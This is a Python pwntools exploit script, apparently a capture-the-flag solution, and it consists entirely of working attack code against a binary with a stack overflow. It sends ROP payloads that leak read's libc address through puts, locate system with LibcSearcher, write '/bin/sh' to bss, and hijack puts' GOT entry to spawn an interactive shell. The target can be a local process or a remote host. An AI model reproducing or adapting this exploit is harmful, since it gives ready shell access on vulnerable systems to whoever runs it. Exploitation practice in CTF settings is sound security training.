#coding:utf-8
from pwn import *
from LibcSearcher import *

if len(sys.argv) == 3:
	io = remote(sys.argv[1],int(sys.argv[2]))
elif len(sys.argv) == 2:
	io = process(sys.argv[1])

readn = 0x40063D
start = 0x40068E
read_got = 0x601028
put_plt = 0x400500
put_got = 0x601018
length = 0x40
max_length = 200
bss = 0x601040

pop_rdi = 0x0000000000400763
pop_rsi_r15 = 0x0000000000400761

def stageone():
    payload = 'A'*length+"AAAAAAAA"+p64(pop_rdi)+p64(read_got) \
	+p64(put_plt)+p64(pop_rdi)+p64(bss) \
	+p64(pop_rsi_r15)+p64(7)+p64(0)+p64(readn)+p64(start)
    payload += "A"*(max_length-len(payload))
    io.send(payload)
    sleep(1)
    io.send("/bin/sh")
    print io.recvuntil("bye~")
    return u64(io.recv()[1:-1].ljust(8,'\0'))

read_addr = stageone()
print "read address: ", hex(read_addr)

libc = LibcSearcher("read",read_addr)
libc_base = read_addr - libc.dump("read")
system_addr = libc_base + libc.dump("system")
sys = p64(system_addr)
print "system address: ",hex(system_addr)

def stagetwo():
    payload = 'A'*length+"AAAAAAAA"+p64(pop_rdi)+p64(put_got) \
	+p64(pop_rsi_r15)+p64(len(sys))+p64(0)+p64(readn)+p64(pop_rdi)+p64(bss) \
	+p64(system_addr)+p64(start)
    payload += "A"*(max_length-len(payload))
    io.send(payload)
    print io.recv()
    io.send(sys)
    

stagetwo()
io.interactive()

